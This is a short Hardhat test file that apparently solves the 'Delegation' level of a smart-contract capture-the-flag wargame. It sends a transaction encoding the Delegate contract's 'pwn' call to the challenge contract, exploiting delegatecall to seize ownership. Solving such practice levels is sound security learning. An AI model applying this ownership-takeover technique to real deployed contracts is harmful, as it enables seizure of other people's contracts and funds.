import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { txConfirmation } from "./utils";

describe("Delegation Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "6", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      const delegate = await ethers.getContractFactory("Delegate")
      await txConfirmation(
        eoa.sendTransaction({
          to: challenge.address,
          data: delegate.interface.encodeFunctionData("pwn"),
          gasLimit: 40000
        })
      );
    }
  }));
});
